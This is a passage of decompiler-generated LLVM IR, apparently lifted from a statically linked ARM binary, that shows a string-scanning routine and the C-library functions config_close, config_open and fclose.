  store i32 %v6_15300, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_152fc, %bb70
  %v2_15304 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15304, i32* %r3.global-to-local, align 4
  %v2_15308 = icmp eq i32 %v2_15304, 0
  store i1 %v2_15308, i1* %cpsr_z.global-to-local, align 1
  %v0_15324.pre = load i32, i32* @r4, align 4
  br i1 %v2_15308, label %dec_label_pc_15320, label %dec_label_pc_15310

dec_label_pc_15310:                               ; preds = %bb71
  store i32 %v0_15324.pre, i32* @r0, align 4
  %v0_15314 = load i32, i32* @sl, align 4
  %v2_15318 = inttoptr i32 %v0_15324.pre to i8*
  %v3_15318 = call i32 @__GI_strspn(i8* %v2_15318, i32 %v0_15314)
  store i32 %v3_15318, i32* %r0.global-to-local, align 4
  %v0_1531c = load i32, i32* @r4, align 4
  %v2_1531c = add i32 %v0_1531c, %v3_15318
  store i32 %v2_1531c, i32* @r4, align 4
  br label %dec_label_pc_15320

dec_label_pc_15320:                               ; preds = %bb71, %dec_label_pc_15310
  %v0_15324 = phi i32 [ %v2_1531c, %dec_label_pc_15310 ], [ %v0_15324.pre, %bb71 ]
  %v0_15320 = load i32, i32* @r6, align 4
  %v1_15320 = add i32 %v0_15320, 1
  store i32 %v1_15320, i32* @r6, align 4
  %v1_15324 = inttoptr i32 %v0_15324 to i8*
  %v2_15324 = load i8, i8* %v1_15324, align 1
  %v3_15324 = zext i8 %v2_15324 to i32
  store i32 %v3_15324, i32* %r2.global-to-local, align 4
  %v2_15328 = icmp eq i8 %v2_15324, 0
  store i1 %v2_15328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15328, label %dec_label_pc_15340, label %dec_label_pc_15330

dec_label_pc_15330:                               ; preds = %dec_label_pc_1524c, %dec_label_pc_15320
  %v0_1527c = phi i32 [ %v0_15324, %dec_label_pc_15320 ], [ %v0_1532412, %dec_label_pc_1524c ]
  %v2_1527c = phi i32 [ %v1_15320, %dec_label_pc_15320 ], [ %v0_15264, %dec_label_pc_1524c ]
  %v1_15334 = phi i32 [ %v3_15324, %dec_label_pc_15320 ], [ %v3_1532415, %dec_label_pc_1524c ]
  %v0_15330 = load i32, i32* @r7, align 4
  %v1_15330 = inttoptr i32 %v0_15330 to i8*
  %v2_15330 = load i8, i8* %v1_15330, align 1
  %v3_15330 = zext i8 %v2_15330 to i32
  store i32 %v3_15330, i32* %r3.global-to-local, align 4
  %v9_15334 = icmp eq i32 %v3_15330, %v1_15334
  store i1 %v9_15334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15334, label %dec_label_pc_15340, label %bb72

bb72:                                             ; preds = %dec_label_pc_15330
  %v2_15338 = load i32, i32* @sb, align 4
  %v3_15338 = sub i32 %v2_1527c, %v2_15338
  %v5_15338 = xor i32 %v2_15338, %v2_1527c
  %v6_15338 = xor i32 %v3_15338, %v2_1527c
  %v7_15338 = and i32 %v6_15338, %v5_15338
  %v8_15338 = icmp slt i32 %v7_15338, 0
  %v9_15338 = icmp slt i32 %v3_15338, 0
  %v10_15338 = icmp eq i32 %v2_1527c, %v2_15338
  store i1 %v10_15338, i1* %cpsr_z.global-to-local, align 1
  %v2_1533c = xor i1 %v9_15338, %v8_15338
  br i1 %v2_1533c, label %dec_label_pc_1526c, label %dec_label_pc_15340

dec_label_pc_15340:                               ; preds = %dec_label_pc_15330, %dec_label_pc_15320, %bb72, %dec_label_pc_1524c
  %v0_15344 = phi i32 [ %v0_15264, %dec_label_pc_1524c ], [ %v2_1527c, %dec_label_pc_15330 ], [ %v1_15320, %dec_label_pc_15320 ], [ %v2_1527c, %bb72 ]
  store i32 %v3_15064, i32* %r2.global-to-local, align 4
  %v9_15344 = icmp eq i32 %v0_15344, %v3_15064
  store i1 %v9_15344, i1* %cpsr_z.global-to-local, align 1
  %v6_15348 = icmp slt i32 %v0_15344, %v3_15064
  br i1 %v6_15348, label %dec_label_pc_1534c, label %dec_label_pc_15358

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15340
  %v0_1534c = load i32, i32* @r8, align 4
  %v1_1534c = and i32 %v0_1534c, 1048576
  %v2_1534c = icmp eq i32 %v1_1534c, 0
  store i1 %v2_1534c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1534c, label %dec_label_pc_150a4.backedge, label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %dec_label_pc_1534c, %dec_label_pc_1520c, %.thread, %entry
  br label %dec_label_pc_15358

dec_label_pc_15358:                               ; preds = %dec_label_pc_15340, %dec_label_pc_15128, %dec_label_pc_15354
  %v0_15358 = phi i32 [ %v0_15138, %dec_label_pc_15128 ], [ 0, %dec_label_pc_15354 ], [ %v0_15344, %dec_label_pc_15340 ]
  store i32 %v0_15358, i32* %r0.global-to-local, align 4
  store i32 %v3_15040, i32* @r4, align 4
  store i32 %v6_15040, i32* @r5, align 4
  store i32 %v9_15040, i32* @r6, align 4
  store i32 %v12_15040, i32* @r7, align 4
  store i32 %v15_15040, i32* @r8, align 4
  store i32 %v18_15040, i32* @sb, align 4
  store i32 %v21_15040, i32* @sl, align 4
  store i32 %v24_15040, i32* @fp, align 4
  ret i32 %v0_15358

; uselistorder directives
  uselistorder i32 %v0_15358, { 1, 0 }
  uselistorder i32 %v0_15344, { 0, 2, 1 }
  uselistorder i32 %v3_15338, { 1, 0 }
  uselistorder i32 %v2_15338, { 1, 0, 2 }
  uselistorder i32 %v2_1527c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15324.pre, { 0, 2, 1 }
  uselistorder i32 %v5_152b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15264, { 1, 0, 2 }
  uselistorder i1 %v9_15244, { 1, 0 }
  uselistorder i32 %v3_1521c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1520c, { 1, 0 }
  uselistorder i1 %v8_15204, { 1, 0 }
  uselistorder i32 %v3_151d4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_151c4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_151ac, { 1, 0, 2 }
  uselistorder i32 %v1_1519c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15188, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15180, { 1, 0 }
  uselistorder i32 %v1_1516c, { 1, 0 }
  uselistorder i32 %v1_15168, { 1, 0 }
  uselistorder i32 %v2_15144, { 1, 0 }
  uselistorder i32 %v1_15128, { 2, 0, 1 }
  uselistorder i32 %v0_15110, { 1, 0 }
  uselistorder i32 %v1_15100, { 0, 2, 1 }
  uselistorder i32* %v1_15270, { 1, 0 }
  uselistorder i1 %v2_15218, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1508c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15080, { 2, 1, 0 }
  uselistorder i32 %v3_15068, { 1, 2, 0 }
  uselistorder i32 %v3_15064, { 2, 1, 0 }
  uselistorder i32 %v1_1505c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15340, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15330, { 1, 0 }
  uselistorder label %dec_label_pc_15320, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152d4, { 1, 0 }
  uselistorder label %dec_label_pc_150a4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15234, { 1, 0 }
  uselistorder label %dec_label_pc_1520c, { 1, 0 }
  uselistorder label %dec_label_pc_15200, { 0, 2, 1 }
  uselistorder label %dec_label_pc_151c4, { 1, 0 }
  uselistorder label %dec_label_pc_150f8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1536c = icmp eq i32* %arg1, null
  br i1 %v2_1536c, label %dec_label_pc_15394, label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %entry
  %v2_15374 = load i32, i32* %arg1, align 4
  %v1_15378 = inttoptr i32 %v2_15374 to i16*
  %v2_15378 = call i32 @__GI_fclose(i16* %v1_15378)
  %v0_1537c = load i32, i32* @r4, align 4
  %v1_1537c = add i32 %v0_1537c, 20
  %v2_1537c = inttoptr i32 %v1_1537c to i32*
  %v3_1537c = load i32, i32* %v2_1537c, align 4
  %v2_15380 = icmp eq i32 %v3_1537c, 0
  br i1 %v2_15380, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15374
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15374, %bb
  store i32 86924, i32* @lr, align 4
  %v1_15388 = xor i1 %v2_15380, true
  call void @__pseudo_cond_branch(i1 %v1_15388, i32 ptrtoint (i32* @global_var_12a54.33 to i32))
  %v0_1538c = load i32, i32* @r4, align 4
  store i32 %v0_1538c, i32* @r0, align 4
  %v0_15390 = call i32 @free()
  br label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %entry, %bb6
  %v1_15398 = phi i32 [ 0, %entry ], [ %v0_15390, %bb6 ]
  ret i32 %v1_15398

; uselistorder directives
  uselistorder label %dec_label_pc_15394, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_153a8 = load i32, i32* @r4, align 4
  store i32 %v3_153a8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -33972), i32* @r1, align 4
  %v0_153b0 = call i32 @__GI_fopen()
  store i32 %v0_153b0, i32* %r0.global-to-local, align 4
  store i32 %v0_153b0, i32* @r4, align 4
  %v2_153b4 = icmp eq i32 %v0_153b0, 0
  br i1 %v2_153b4, label %bb, label %dec_label_pc_153c0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_153c0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_153c8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_153c8, i32* %r0.global-to-local, align 4
  %v2_153cc = icmp eq i32 %v2_153c8, 0
  br i1 %v2_153cc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_153c0
  %v1_153d0 = load i32, i32* @r4, align 4
  %v3_153d0 = inttoptr i32 %v2_153c8 to i32*
  store i32 %v1_153d0, i32* %v3_153d0, align 4
  %v1_153d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_153c0, %bb4
  %v1_153d8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_153c0 ], [ %v1_153d8.pre, %bb4 ]
  %v2_153d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_153d4, i32* @r4, align 4
  ret i32 %v1_153d8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 1, 0, 31, 30, 29, 28, 27, 26, 2, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_153e4 = load i32, i32* @r4, align 4
  store i32 %v3_153e4, i32* %stack_var_-36, align 4
  %v6_153e4 = load i32, i32* @r5, align 4
  %v9_153e4 = load i32, i32* @r6, align 4
  %v12_153e4 = load i32, i32* @r7, align 4
  %v2_153e8 = add i32 %tmp, 52
  %v3_153e8 = inttoptr i32 %v2_153e8 to i32*
  %v4_153e8 = load i32, i32* %v3_153e8, align 4
  store i32 %v4_153e8, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153f0 = icmp eq i32 %v4_153e8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r8, align 4
  br i1 %v2_153f0, label %dec_label_pc_15404, label %dec_label_pc_15468

dec_label_pc_15404:                               ; preds = %entry
  %v0_15404 = call i32 @__aeabi_read_tp()
  store i32 %v0_15404, i32* %r0.global-to-local, align 4
  %v0_15408 = load i32, i32* @r5, align 4
  %v1_15408 = add i32 %v0_15408, 64
  %v2_15408 = inttoptr i32 %v1_15408 to i32*
  %v3_15408 = load i32, i32* %v2_15408, align 4
  store i32 %v3_15408, i32* %r3.global-to-local, align 4
  %v1_1540c = add i32 %v0_15404, -1168
  store i32 %v1_1540c, i32* @r6, align 4
  %v3_15410 = icmp uge i32 %v3_15408, %v1_1540c
  store i1 %v3_15410, i1* %cpsr_c.global-to-local, align 1
  %v9_15410 = icmp eq i32 %v3_15408, %v1_1540c
  br i1 %v9_15410, label %dec_label_pc_1545c, label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %dec_label_pc_15404
  %v1_15418 = add i32 %v0_15408, 56
  store i32 %v1_15418, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15418, i32* %r2.global-to-local, align 4
  %v0_15424 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15424, i32* @r4, align 4
  %v1_15428115 = inttoptr i32 %v1_15418 to i32*
  %v2_15428116 = load i32, i32* %v1_15428115, align 4
  store i32 %v2_15428116, i32* %r3.global-to-local, align 4
  %v3_1542c118 = icmp uge i32 %v2_15428116, %v0_15424
  store i1 %v3_1542c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1542c124 = icmp eq i32 %v2_15428116, %v0_15424
  br i1 %v9_1542c124, label %dec_label_pc_15434, label %dec_label_pc_1544c

dec_label_pc_15434:                               ; preds = %dec_label_pc_15418, %dec_label_pc_15434.dec_label_pc_15428_crit_edge
  %v0_15434125 = phi i32 [ %v1_1542c.pre, %dec_label_pc_15434.dec_label_pc_15428_crit_edge ], [ %v0_15424, %dec_label_pc_15418 ]
  store i32 %v0_15434125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15444 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15444, label %dec_label_pc_15448, label %dec_label_pc_15434.dec_label_pc_15428_crit_edge

dec_label_pc_15434.dec_label_pc_15428_crit_edge:  ; preds = %dec_label_pc_15434
  %v0_15428.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1542c.pre = load i32, i32* @r4, align 4
  %v1_15428 = inttoptr i32 %v0_15428.pre to i32*
  %v2_15428 = load i32, i32* %v1_15428, align 4
  store i32 %v2_15428, i32* %r3.global-to-local, align 4
  %v3_1542c = icmp uge i32 %v2_15428, %v1_1542c.pre
  store i1 %v3_1542c, i1* %cpsr_c.global-to-local, align 1
  %v9_1542c = icmp eq i32 %v2_15428, %v1_1542c.pre
  br i1 %v9_1542c, label %dec_label_pc_15434, label %dec_label_pc_1544c

dec_label_pc_15448:                               ; preds = %dec_label_pc_15434
  %v0_15448 = load i32, i32* @r4, align 4
  store i32 %v0_15448, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1544c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_15418, %dec_label_pc_15434.dec_label_pc_15428_crit_edge, %dec_label_pc_15448
  %v0_1544c = phi i32 [ %v0_15448, %dec_label_pc_15448 ], [ %v2_15428116, %dec_label_pc_15418 ], [ %v2_15428, %dec_label_pc_15434.dec_label_pc_15428_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1544c = icmp eq i32 %v0_1544c, 0
  br i1 %v2_1544c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1544c
  %v1_15450 = load i32, i32* @r7, align 4
  store i32 %v1_15450, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1544c, %bb
  %v1_15454 = xor i1 %v2_1544c, true
  call void @__pseudo_cond_branch(i1 %v1_15454, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_15458 = load i32, i32* @r6, align 4
  %v1_15458 = load i32, i32* @r5, align 4
  %v2_15458 = add i32 %v1_15458, 64
  %v3_15458 = inttoptr i32 %v2_15458 to i32*
  store i32 %v0_15458, i32* %v3_15458, align 4
  %v0_1545c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1545c

dec_label_pc_1545c:                               ; preds = %dec_label_pc_15404, %bb41
  %v0_1545c = phi i32 [ %v0_15408, %dec_label_pc_15404 ], [ %v0_1545c.pre, %bb41 ]
  %v1_1545c = add i32 %v0_1545c, 60
  %v2_1545c = inttoptr i32 %v1_1545c to i32*
  %v3_1545c = load i32, i32* %v2_1545c, align 4
  %v1_15460 = add i32 %v3_1545c, 1
  store i32 %v1_15460, i32* %r3.global-to-local, align 4
  store i32 %v1_15460, i32* %v2_1545c, align 4
  %v0_15468.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15468

dec_label_pc_15468:                               ; preds = %entry, %dec_label_pc_1545c
  %v1_15470 = phi i32 [ %tmp, %entry ], [ %v0_15468.pre, %dec_label_pc_1545c ]
  %v1_15468 = inttoptr i32 %v1_15470 to i16*
  %v2_15468 = load i16, i16* %v1_15468, align 2
  %v3_15468 = zext i16 %v2_15468 to i32
  store i32 %v3_15468, i32* %r3.global-to-local, align 4
  %v1_1546c = and i32 %v3_15468, 64
  %v2_1546c = icmp eq i32 %v1_1546c, 0
  br i1 %v2_1546c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15468
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15468, %bb42
  %storemerge = phi i32 [ %v1_15470, %bb42 ], [ %v1_1546c, %dec_label_pc_15468 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 87160, i32* @lr, align 4
  %v1_15474 = xor i1 %v2_1546c, true
  call void @__pseudo_cond_branch(i1 %v1_15474, i32 ptrtoint (i32* @global_var_162b8.597 to i32))
  %v0_15478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15478, i32* %fp.global-to-local, align 4
  %v0_1547c = load i32, i32* @r5, align 4
  %v1_1547c = add i32 %v0_1547c, 4
  %v2_1547c = inttoptr i32 %v1_1547c to i32*
  %v3_1547c = load i32, i32* %v2_1547c, align 4
  store i32 %v3_1547c, i32* %r0.global-to-local, align 4
  %v1_15480 = call i32 @__GI___libc_close(i32 %v3_1547c)
  store i32 %v1_15480, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15488 = load i32, i32* @r8, align 4
  %v2_15488 = add i32 %v0_15488, 160
  %v3_15488 = inttoptr i32 %v2_15488 to i32*
  %v4_15488 = load i32, i32* %v3_15488, align 4
  store i32 %v4_15488, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1548c = icmp slt i32 %v1_15480, 0
  br i1 %v1_1548c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15494 = add i32 %v4_15488, 8
  %v2_15494 = inttoptr i32 %v1_15494 to i32*
  %v3_15494 = load i32, i32* %v2_15494, align 4
  store i32 %v3_15494, i32* %r3.global-to-local, align 4
  %v0_15498 = call i32 @__aeabi_read_tp()
  store i32 %v0_15498, i32* %r0.global-to-local, align 4
  %v1_1549c = add i32 %v0_15498, -1168
  store i32 %v1_1549c, i32* %sl.global-to-local, align 4
  %v0_154a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_154a0 = icmp uge i32 %v0_154a0, %v1_1549c
  store i1 %v3_154a0, i1* %cpsr_c.global-to-local, align 1
  %v9_154a0 = icmp eq i32 %v0_154a0, %v1_1549c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_154a8 = load i32, i32* @r5, align 4
  %v2_154a8 = add i32 %v1_154a8, 4
  %v3_154a8 = inttoptr i32 %v2_154a8 to i32*
  store i32 -1, i32* %v3_154a8, align 4
  br i1 %v9_154a0, label %dec_label_pc_154f0, label %dec_label_pc_154b0

dec_label_pc_154b0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_154b4 = load i32, i32* @r7, align 4
  store i32 %v0_154b4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_154bc108 = inttoptr i32 %v0_154b4 to i32*
  %v2_154bc109 = load i32, i32* %v1_154bc108, align 4
  store i32 %v2_154bc109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_154c0111 = icmp eq i32 %v2_154bc109, 0
  br i1 %v9_154c0111, label %dec_label_pc_154c8, label %dec_label_pc_154e0

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154b0, %dec_label_pc_154c8.dec_label_pc_154bc_crit_edge
  %v0_154c8112 = phi i32 [ %v1_154c0.pre, %dec_label_pc_154c8.dec_label_pc_154bc_crit_edge ], [ 0, %dec_label_pc_154b0 ]
  store i32 %v0_154c8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_154d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_154d8, label %dec_label_pc_154dc, label %dec_label_pc_154c8.dec_label_pc_154bc_crit_edge

dec_label_pc_154c8.dec_label_pc_154bc_crit_edge:  ; preds = %dec_label_pc_154c8
  %v0_154bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154c0.pre = load i32, i32* @r4, align 4
  %v1_154bc = inttoptr i32 %v0_154bc.pre to i32*
  %v2_154bc = load i32, i32* %v1_154bc, align 4
  store i32 %v2_154bc, i32* %r3.global-to-local, align 4
  %v3_154c0 = icmp uge i32 %v2_154bc, %v1_154c0.pre
  store i1 %v3_154c0, i1* %cpsr_c.global-to-local, align 1
  %v9_154c0 = icmp eq i32 %v2_154bc, %v1_154c0.pre
  br i1 %v9_154c0, label %dec_label_pc_154c8, label %dec_label_pc_154e0

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154c8
  %v0_154dc = load i32, i32* @r4, align 4
  store i32 %v0_154dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_154e0

dec_label_pc_154e0:                               ; preds = %dec_label_pc_154b0, %dec_label_pc_154c8.dec_label_pc_154bc_crit_edge, %dec_label_pc_154dc
  %v0_154e0 = phi i32 [ %v0_154dc, %dec_label_pc_154dc ], [ %v2_154bc109, %dec_label_pc_154b0 ], [ %v2_154bc, %dec_label_pc_154c8.dec_label_pc_154bc_crit_edge ]
  %v1_154e0 = phi i32 [ %v0_154dc, %dec_label_pc_154dc ], [ 0, %dec_label_pc_154b0 ], [ %v1_154c0.pre, %dec_label_pc_154c8.dec_label_pc_154bc_crit_edge ]
  %v3_154e0 = icmp uge i32 %v0_154e0, %v1_154e0
  store i1 %v3_154e0, i1* %cpsr_c.global-to-local, align 1
  %v9_154e0 = icmp eq i32 %v0_154e0, %v1_154e0
  br i1 %v9_154e0, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_154e0
  %v1_154e4 = load i32, i32* @r7, align 4
  store i32 %v1_154e4, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_154e0, %bb46
  %v1_154e8 = xor i1 %v9_154e0, true
  call void @__pseudo_cond_branch(i1 %v1_154e8, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_154ec = load i32, i32* %sl.global-to-local, align 4
  %v1_154ec = load i32, i32* @r7, align 4
  %v2_154ec = add i32 %v1_154ec, 8
  %v3_154ec = inttoptr i32 %v2_154ec to i32*
  store i32 %v0_154ec, i32* %v3_154ec, align 4
  br label %dec_label_pc_154f0

dec_label_pc_154f0:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_154f4 = load i32, i32* @r8, align 4
  %v2_154f4 = add i32 %v0_154f4, 160
  %v3_154f4 = inttoptr i32 %v2_154f4 to i32*
  %v4_154f4 = load i32, i32* %v3_154f4, align 4
  store i32 %v4_154f4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_154fc = add i32 %v0_154f4, 12
  %v3_154fc = inttoptr i32 %v2_154fc to i32*
  %v4_154fc = load i32, i32* %v3_154fc, align 4
  store i32 %v4_154fc, i32* %r2.global-to-local, align 4
  %v1_15500 = add i32 %v4_154f4, 4
  %v2_15500 = inttoptr i32 %v1_15500 to i32*
  %v3_15500 = load i32, i32* %v2_15500, align 4
  store i32 %v3_15500, i32* %r1.global-to-local, align 4
  %v1_15504 = inttoptr i32 %v4_154fc to i32*
  %v2_15504 = load i32, i32* %v1_15504, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15508 = icmp eq i32 %v3_15500, 0
  %v1_1550c = add i32 %v2_15504, 1
  store i32 %v1_1550c, i32* %r3.global-to-local, align 4
  store i32 %v1_1550c, i32* %v1_15504, align 4
  br i1 %v2_15508, label %dec_label_pc_15518, label %dec_label_pc_15578

dec_label_pc_15518:                               ; preds = %dec_label_pc_154f0
  %v0_15518 = load i32, i32* %r1.global-to-local, align 4
  %v1_15518 = load i32, i32* %r0.global-to-local, align 4
  %v2_15518 = add i32 %v1_15518, 8
  %v3_15518 = inttoptr i32 %v2_15518 to i32*
  store i32 %v0_15518, i32* %v3_15518, align 4
  %v0_1551c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1551c, i32* @r7, align 4
  br label %dec_label_pc_15520

dec_label_pc_15520:                               ; preds = %dec_label_pc_15550.dec_label_pc_15520_crit_edge, %dec_label_pc_15518
  %v0_15520 = phi i32 [ %v0_15520.pre, %dec_label_pc_15550.dec_label_pc_15520_crit_edge ], [ %v0_1551c, %dec_label_pc_15518 ]
  %v1_15520 = inttoptr i32 %v0_15520 to i32*
  %v2_15520 = load i32, i32* %v1_15520, align 4
  store i32 %v2_15520, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15520, i32* %r2.global-to-local, align 4
  %v2_1552c96 = load i32, i32* %v1_15520, align 4
  store i32 %v2_1552c96, i32* %r3.global-to-local, align 4
  %v3_1553098 = icmp uge i32 %v2_1552c96, %v2_15520
  store i1 %v3_1553098, i1* %cpsr_c.global-to-local, align 1
  %v9_15530104 = icmp eq i32 %v2_1552c96, %v2_15520
  br i1 %v9_15530104, label %dec_label_pc_15538, label %dec_label_pc_15550

dec_label_pc_15538:                               ; preds = %dec_label_pc_15520, %dec_label_pc_15538.dec_label_pc_1552c_crit_edge
  %v0_15538105 = phi i32 [ %v1_15530.pre, %dec_label_pc_15538.dec_label_pc_1552c_crit_edge ], [ %v2_15520, %dec_label_pc_15520 ]
  store i32 %v0_15538105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15548 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15548, label %dec_label_pc_1554c, label %dec_label_pc_15538.dec_label_pc_1552c_crit_edge

dec_label_pc_15538.dec_label_pc_1552c_crit_edge:  ; preds = %dec_label_pc_15538
  %v0_1552c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15530.pre = load i32, i32* @r4, align 4
  %v1_1552c = inttoptr i32 %v0_1552c.pre to i32*
  %v2_1552c = load i32, i32* %v1_1552c, align 4
  store i32 %v2_1552c, i32* %r3.global-to-local, align 4
  %v3_15530 = icmp uge i32 %v2_1552c, %v1_15530.pre
  store i1 %v3_15530, i1* %cpsr_c.global-to-local, align 1
  %v9_15530 = icmp eq i32 %v2_1552c, %v1_15530.pre
  br i1 %v9_15530, label %dec_label_pc_15538, label %dec_label_pc_15550

dec_label_pc_1554c:                               ; preds = %dec_label_pc_15538
  %v0_1554c = load i32, i32* @r4, align 4
